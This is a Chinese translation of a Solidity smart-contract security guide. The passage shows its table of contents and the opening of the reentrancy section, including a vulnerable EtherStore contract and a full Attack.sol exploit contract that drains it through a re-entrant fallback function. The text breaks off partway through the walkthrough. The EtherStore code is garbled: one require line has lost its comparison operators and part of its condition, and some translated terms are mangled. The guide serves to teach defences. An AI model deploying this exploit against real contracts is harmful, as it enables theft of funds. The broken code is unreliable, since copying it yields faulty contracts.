原文链接：  
译者：爱上平顶山@慢雾安全团队  
校对：keywolf@慢雾安全团队  
来源：[《Solidity 安全：已知攻击方法和常见防御模式综合列表》](https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md "Solidity 安全：已知攻击方法和常见防御模式综合列表")
虽然处于起步阶段，但是 Solidity
已被广泛采用，并被用于编译我们今天看到的许多以太坊智能合约中的字节码。相应地，开发者和用户也获得许多严酷的教训，例如发现语言和EVM的细微差别。这篇文章旨在作为一个相对深入和最新的介绍性文章，详述
Solidity 开发人员曾经踩过的坑，避免后续开发者重蹈覆辙。
## 目录
  * 重入漏洞
    * 漏洞
    * 预防技术
    * 真实世界的例子：DAO
  * 算法上下溢出
    * 漏洞
    * 预防技术
    * 实际示例：PoWHC和批量传输溢出（CVE-2018-10299）
  * 意外的Ether
    * 漏洞
    * 预防技术
    * 真实世界的例子：未知
  * Delegatecall
    * 漏洞
    * 预防技术
    * 真实世界的例子：Parity Multisig Wallet（Second Hack）
  * 默认可见性
    * 漏洞
    * 预防技术
    * 真实案例：Parity MultiSig Wallet（First Hack）
  * 函数错误
    * 漏洞
    * 预防技术
    * 真实案例：PRNG合约
  * 外部合约引用
    * 漏洞
    * 预防技术
    * 真实的例子：再入蜜罐
  * 短地址/参数攻击
    * 漏洞
    * 预防技术
    * 真实世界的例子：未知
  * 未检查的CALL返回值
    * 漏洞
    * 预防技术
    * 真实的例子：Etherpot和以太之王
  * 条件竞争/非法预先交易
    * 漏洞
    * 预防技术
    * 真实世界的例子：ERC20和Bancor
  * 拒绝服务（DOS）
    * 漏洞
    * 预防技术
    * 真实的例子：GovernMental
  * 锁定时间戳操作
    * 漏洞
    * 预防技术
    * 真实的例子：GovernMental
  * 谨慎构建函数
    * 漏洞
    * 预防技术
    * 真实世界的例子：Rubixi
  * 虚拟化存储指针
    * 漏洞
    * 预防技术
    * 真实世界的例子：蜂蜜罐：OpenAddressLottery和CryptoRoulette
  * 浮点和数值精度
    * 漏洞
    * 预防技术
    * 真实世界的例子：Ethstick
  * tx.origin身份验证
    * 漏洞
    * 预防技术
    * 真实世界的例子：未知
  * 以太坊怪异模式
    * 无键ether
    * 一次性地址
  * 有趣的加密相关的hacks/bugs列表
  * 参考文献/更多阅读列表
    * [Ethereum Wiki - Safety](https://github.com/ethereum/wiki/wiki/Safety)
    * [Solidity Docs - Security Considerations](solidity.readthedocs.io/en/latest/security-considerations.html)
    * [Consensus - Ethereum Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices)
    * [History of Ethereum Security Vulnerabilities, Hacks and Their Fixes](https://applicature.com/blog/history-of-ethereum-security-vulnerabilities-hacks-and-their-fixes)
    * [Decentralized Application Security Project (DASP) Top 10 of 2018](http://www.dasp.co/)
    * [A Survey of attacks on Ethereum Smart Contracts](https://eprint.iacr.org/2016/1007.pdf)
    * [Ethereum Smart Contract Security](https://medium.com/cryptronics/ethereum-smart-contract-security-73b0ede73fa8)
    * [Lessons Learnt from the Underhanded Solidity Contest](https://medium.com/@chriseth/lessons-learnt-from-the-underhanded-solidity-contest-8388960e09b1)
## 重入漏洞
以太坊智能合约的特点之一是能够调用和利用其他外部合约的代码。合约通常也处理Ether，因此通常会将Ether发送给各种外部用户地址。调用外部合约或将以太网发送到地址的操作需要合约提交外部调用。这些外部调用可能被攻击者劫持，迫使合约执行进一步的代码（即通过回退函数），包括回调自身。因此代码执行“
重新进入 ”合约。这种攻击被用于臭名昭着的DAO攻击。
有关重入攻击的进一步阅读，请参阅[重入式对智能合约](https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4)和[Consensus -以太坊智能合约最佳实践](https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert)。
### 漏洞
当合约将ether发送到未知地址时，可能会发生此攻击。攻击者可以在[fallback函数](https://solidity.readthedocs.io/en/latest/contracts.html?highlight=fallback#fallback-function)中的外部地址处构建一个包含恶意代码的合约。因此，当合约向此地址发送ether时，它将调用恶意代码。通常，恶意代码在易受攻击的合约上执行一项功能，执行开发人员不希望的操作。“重入”这个名称来源于外部恶意合约回复了易受攻击合约的功能，并在易受攻击的合约的任意位置“
重新输入”了代码执行。
为了澄清这一点，请考虑简单易受伤害的合约，该合约充当以太坊保险库，允许存款人每周只提取1个Ether。
EtherStore.sol：
    contract EtherStore {
        uint256 public withdrawalLimit = 1 ether;
        mapping(address => uint256) public lastWithdrawTime;
        mapping(address => uint256) public balances;
        function depositFunds() public payable {
            balances[msg.sender] += msg.value;
        }
        function withdrawFunds (uint256 _weiToWithdraw) public {
            require(balances[msg.sender] >= _weiToWithdraw);
            // limit the withdrawal
            require(_weiToWithdraw = lastWithdrawTime[msg.sender] + 1 weeks);
            require(msg.sender.call.value(_weiToWithdraw)());
            balances[msg.sender] -= _weiToWithdraw;
            lastWithdrawTime[msg.sender] = now;
        }
     }
该合约有两个公共职能。`depositFunds()`和`withdrawFunds()`。该`depositFunds()`功能只是增加发件人余额。该`withdrawFunds()`功能允许发件人指定要撤回的wei的数量。如果所要求的退出金额小于1Ether并且在上周没有发生撤回，它才会成功。还是呢？...
该漏洞出现在[17]行，我们向用户发送他们所要求的以太数量。考虑一个恶意攻击者创建下列合约，
Attack.sol：
    import "EtherStore.sol";
    contract Attack {
      EtherStore public etherStore;
      // intialise the etherStore variable with the contract address
      constructor(address _etherStoreAddress) {
          etherStore = EtherStore(_etherStoreAddress);
      }
      function pwnEtherStore() public payable {
          // attack to the nearest ether
          require(msg.value >= 1 ether);
          // send eth to the depositFunds() function
          etherStore.depositFunds.value(1 ether)();
          // start the magic
          etherStore.withdrawFunds(1 ether);
      }
      function collectEther() public {
          msg.sender.transfer(this.balance);
      }
      // fallback function - where the magic happens
      function () payable {
          if (etherStore.balance > 1 ether) {
              etherStore.withdrawFunds(1 ether);
          }
      }
    }
让我们看看这个恶意合约是如何利用我们的`EtherStore`合约的。攻击者可以`0x0...123`使用`EtherStore`合约地址作为构造函数参数来创建上述合约（假设在地址中）。这将初始化并将公共变量`etherStore`指向我们想要攻击的合约。
然后攻击者会调用这个`pwnEtherStore()`函数，并且有一些以太（大于或等于1），`1
ether`这个例子可以说。在这个例子中，我们假设一些其他用户已经将以太币存入这份合约中，这样它的当前余额就是`10 ether`。然后会发生以下情况：
  1. Attack.sol -Line[15] -的`depositFunds()`所述EtherStore合约的功能将与被叫`msg.value`的`1 ether`（和大量gas）。sender（msg.sender）将是我们的恶意合约`（0x0...123）`。因此，`balances[0x0..123] = 1 ether`。
  2. Attack.sol - Line [17] - 恶意合约将使用一个参数来调用合约的withdrawFunds()功能。这将通过所有要求（合约的行[12] - [16] ），因为我们以前没有提款。